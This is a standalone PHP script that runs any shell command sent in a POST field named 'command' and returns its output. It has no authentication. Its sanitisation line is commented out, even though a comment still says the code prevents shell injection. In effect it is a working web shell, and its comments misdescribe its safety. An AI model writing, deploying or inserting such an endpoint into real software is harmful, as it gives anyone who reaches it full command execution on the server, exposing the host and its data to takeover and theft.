<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {
    $command = $_POST['command'];
    
    // Sanitize command to prevent shell injection
    //$sanitizedCommand = escapeshellcmd($command);
    $sanitizedCommand = $command;

    
    // Execute the command
    //$output = shell_exec($sanitizedCommand);
    

    // Capture both stdout and stderr
    $descriptorspec = [
        0 => ["pipe", "r"],  // stdin
        1 => ["pipe", "w"],  // stdout
        2 => ["pipe", "w"]   // stderr
    ];
    
    $process = proc_open($sanitizedCommand, $descriptorspec, $pipes);
    
    if (is_resource($process)) {
        $stdout = stream_get_contents($pipes[1]);
        $stderr = stream_get_contents($pipes[2]);
        
        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        
        // Wait for the process to finish
        proc_close($process);
        
        // Combine stdout and stderr
        $fullOutput = $stdout . "\n" . $stderr;
        
        echo htmlspecialchars($fullOutput);
    } else {
        echo "Failed to execute command.";
    }
} else {
    echo "Invalid request.";
}
?>